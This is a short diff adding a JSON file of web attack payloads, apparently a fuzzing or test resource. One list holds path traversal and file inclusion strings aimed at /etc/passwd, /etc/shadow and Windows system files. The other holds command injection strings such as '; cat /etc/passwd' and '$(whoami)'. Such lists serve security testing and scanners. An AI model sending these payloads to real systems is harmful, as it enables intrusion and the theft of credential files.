@@ -1,0 +1,22 @@
+{
+  "lfi_payloads": [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "/etc/shadow",
+    "/proc/version",
+    "/var/log/apache2/access.log",
+    "C:\\boot.ini",
+    "/etc/passwd%00",
+    "....//....//....//etc/passwd"
+  ],
+  "rce_payloads": [
+    "; id",
+    "| whoami",
+    "`id`",
+    "$(whoami)",
+    "; cat /etc/passwd",
+    "| type C:\\windows\\system32\\drivers\\etc\\hosts",
+    "; ls -la",
+    "&& dir"
+  ]
+}
